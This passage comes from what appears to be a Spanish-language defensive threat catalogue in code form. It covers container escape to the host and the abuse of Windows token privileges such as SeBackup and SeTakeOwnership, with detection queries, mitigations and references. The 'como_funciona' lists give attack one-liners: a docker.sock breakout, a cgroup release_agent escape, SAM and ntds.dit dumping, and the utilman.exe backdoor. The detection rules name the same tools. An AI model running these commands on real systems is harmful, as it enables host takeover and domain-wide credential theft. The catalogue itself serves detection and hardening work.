    impacto_iam_soc: 'Root en el HOST desde un pod/contenedor comprometido: el salto lateral cloud más frecuente hoy (una webshell en un pod mal configurado = control del nodo y del cluster). En SOC: contenedores con mounts del host, acceso al docker.sock, binarios runc modificados y reglas de Falco tipo release_agent.',
    como_funciona: [
      'Recon interno: deepce o CDK — capsh --print (capabilities), ls -la /var/run/docker.sock, cat /proc/1/cgroup y fdisk -l (¿privileged?)',
      'docker.sock: docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine chroot /host sh → root del host',
      '--privileged: escape por cgroup v1 — mkdir /tmp/cgrp; echo 1 > release_agent con el path del host al payload',
      'runc vulnerable (CVE-2019-5736): PoC que sobrescribe /usr/bin/runc del host; el siguiente exec desde el host dispara el payload como root',
    ],
    deteccion: {
      kql: 'DeviceProcessEvents | where ProcessCommandLine contains "docker" and (ProcessCommandLine contains "--privileged" or ProcessCommandLine contains "-v /:" or ProcessCommandLine contains "docker.sock") | project Timestamp, ProcessCommandLine',
      spl: 'index=falco | regex rule="(?i)(docker\\.sock|privileged|release_agent|new mount|runc)" | stats count by container_name, rule',
      sigma: 'container_escape_attempt (custom)',
    },
    mitigacion: [
      'Prohibir docker.sock montado, hostPath / y --privileged (admission controller: OPA/Gatekeeper, Kyverno, PSA)',
      'Parchear runtime: runc ≥ fix de 2019-02-11 (CVE-2019-5736); containerd/Docker actualizados',
      'Runtime security (Falco/Sysdig): alertar release_agent, mounts del host y acceso al socket',
      'Contenedores endurecidos: cap_drop ALL, seccomp, no-new-privileges, usuario no-root, imágenes mínimas',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1611/',
      'https://nvd.nist.gov/vuln/detail/CVE-2019-5736',
      'https://github.com/stealthcopter/deepce',
    ],
  },
  {
    id: 'PRIV-013',
    nombre: 'Abuso de privilegios de cuenta de Windows',
    alias: ['abuso de derechos de cuenta', 'SeBackup/SeRestore abuse', 'token privileges abuse'],
    categoria: 'PrivEsc',
    severidad: 'High',
    mitre_attack: ['T1134', 'T1003.002'],
    descripcion_tecnica: 'Ciertas cuentas (backup admins, service accounts, usuarios "casi-admin") tienen derechos que no son admin pero valen lo mismo: SeBackupPrivilege (leer CUALQUIER archivo saltándose las ACLs → volcar SAM/SYSTEM/NTDS.dit), SeRestorePrivilege (escribir cualquiera, bypass de ACLs), SeTakeOwnershipPrivilege (apropiarse de cualquier objeto y luego leerlo), SeLoadDriverPrivilege (cargar drivers — código kernel = SYSTEM) y SeDebugPrivilege (abrir cualquier proceso → mimikatz sobre LSASS). whoami /priv los lista; PowerUp/PEASS los cazan.',
    impacto_iam_soc: 'Escalada a DA sin explotar bugs: SAM dump → Pass-the-Hash, NTDS.dit → todo el dominio, driver vulnerable → kernel. En SOC: robocopy /b, diskshadow, takeown y vssadmin ejecutados por cuentas de servicio o usuarios normales — herramientas de backup que nadie audita.',
    como_funciona: [
      'whoami /priv: SeBackup+SeRestore → robocopy /b C:\\Windows\\System32\\config C:\\tmp SAM SYSTEM → mimikatz lsadump::sam → PTH',
      'En un DC con SeBackup: diskshadow (script: set context persistent; begin backup; add C:\\Windows\\NTDS\\ntds.dit; ...) → exfil del ntds.dit + secretsdump -ntds → TODAS las cuentas del dominio',
      'SeTakeOwnership: takeown /f C:\\Windows\\System32\\utilman.exe + icacls grant + copiar cmd.exe encima → SYSTEM en la pantalla de bloqueo (botón de accesibilidad)',
      'SeLoadDriverPrivilege: cargar un driver vulnerable firmado (CapCom/echo_driver) con el loader de gtworek/Priv2Admin → exploit kernel → SYSTEM (el pre-BYOVD clásico)',
    ],
    deteccion: {
      kql: 'DeviceProcessEvents | where FileName in ("robocopy.exe", "diskshadow.exe", "takeown.exe", "vssadmin.exe", "secretsdump.exe") or ProcessCommandLine contains "ntds.dit" or ProcessCommandLine contains "utilman" | project Timestamp, AccountName, ProcessCommandLine',
      spl: 'index=win sourcetype=WinEventLog EventCode=4688 | regex _raw="(?i)(robocopy \\/b|diskshadow|takeown|ntds\\.dit|secretsdump)" | stats count by host, AccountName',
      sigma: 'win_privileged_backup_tool_usage (custom)',
      win_event_ids: [4688],
    },
    mitigacion: [
      'SeBackup/SeRestore SOLO en cuentas de backup dedicadas (y monitorizadas) — jamás en estaciones de trabajo',
      'Hunt: robocopy /b, diskshadow, takeown y accesos a ntds.dit desde cuentas no admin; alertar siempre',
      'SeLoadDriver: WDAC + blocklist de drivers vulnerables firmados (mitiga el abuso del derecho)',
      'Revisar asignaciones de derechos con whoami /priv / SharpUp en los hosts: los rights listados no deben existir en equipos de usuario',
    ],
    referencias: [
      'https://attack.mitre.org/techniques/T1134/',
      'https://github.com/gtworek/Priv2Admin',
      'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation',
    ],
  },
];
